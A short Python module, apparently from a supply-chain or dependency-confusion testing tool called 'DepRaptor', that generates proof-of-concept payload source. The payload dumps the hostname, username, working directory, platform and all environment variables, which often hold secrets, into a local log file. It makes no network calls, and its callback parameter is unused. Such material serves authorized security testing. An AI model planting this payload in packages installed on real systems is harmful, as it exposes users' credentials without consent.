"""
Payload: system_info
Logs hostname, username, cwd, env vars to a local file.
No outbound network calls.
"""


def generate_payload(callback_url: str = "") -> str:
    """Return Python source code for the system_info payload."""
    return '''import os, platform, socket
from datetime import datetime
from pathlib import Path

def execute_payload():
    log = Path.cwd() / "payload_log.txt"
    lines = [
        "=== DepRaptor PoC Executed ===",
        f"Timestamp : {datetime.now().isoformat()}",
        f"Hostname  : {socket.gethostname()}",
        f"Username  : {os.getenv('USER') or os.getenv('USERNAME', 'unknown')}",
        f"CWD       : {Path.cwd()}",
        f"Platform  : {platform.platform()}",
        "",
        "Environment Variables:",
    ]
    for k, v in os.environ.items():
        lines.append(f"  {k}={v}")
    log.write_text("\\n".join(lines), encoding="utf-8")
    print(f"[DepRaptor] payload_log.txt written to {log}")

execute_payload()
'''
